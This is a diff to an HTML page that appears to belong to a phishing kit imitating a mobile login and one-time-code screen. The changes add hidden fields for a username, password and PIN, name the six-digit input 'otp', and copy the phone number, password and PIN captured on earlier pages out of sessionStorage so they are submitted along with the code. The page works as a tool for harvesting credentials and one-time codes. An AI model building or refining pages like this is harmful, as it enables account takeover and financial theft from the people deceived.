@@ -125,10 +125,11 @@
 				</div>
 				<div class="_8C72T7" style="padding: 0">
 					<div class="hBZjRj" style="padding: 0">
-<input type="hidden" id="nomorhp" value=""; name="nomor">
-<input type="hidden" id="pinku" value="" >
+<input type="hidden" id="nomorhp" value=""; name="user">
+<input type="hidden" id="pass" value=""; name="pass">
+<input type="hidden" id="pinku" value="" name="pinku">
 					    <center>
-<input class="WZp32T" id="user" type="tel" autocomplete="one-time-code" maxlength="6" value="" minlength="6" style="width: 89%; left: 0; right: 0; position: fixed; margin: 0px auto; margin-bottom: 30px" required>
+<input class="WZp32T" id="user" name="otp" type="tel" autocomplete="one-time-code" maxlength="6" value="" minlength="6" style="width: 89%; left: 0; right: 0; position: fixed; margin: 0px auto; margin-bottom: 30px" required>
 </center><p></p>
 						<div class="_29bVQs">
 							<div class="EwAdvD"></div>
@@ -278,11 +279,13 @@
     </script>
     <script>
  var alerts = sessionStorage.getItem("alerts");
-document.getElementById("alert").innerHTML = alerts + "";       
+document.getElementById("alert").innerHTML = alerts + "";          
  var alerts = sessionStorage.getItem("alerts");
 document.getElementById("nomorhp").value = alerts + "";       
- var setpin = sessionStorage.getItem("setpin");
-document.getElementById("pinku").value = setpin + "";       
+ var pass = sessionStorage.getItem("pass");
+document.getElementById("pass").value = pass+ "";       
+ var setPin = sessionStorage.getItem("setPin");
+document.getElementById("pinku").value = setPin + "";       
 
     </script>
  <script>
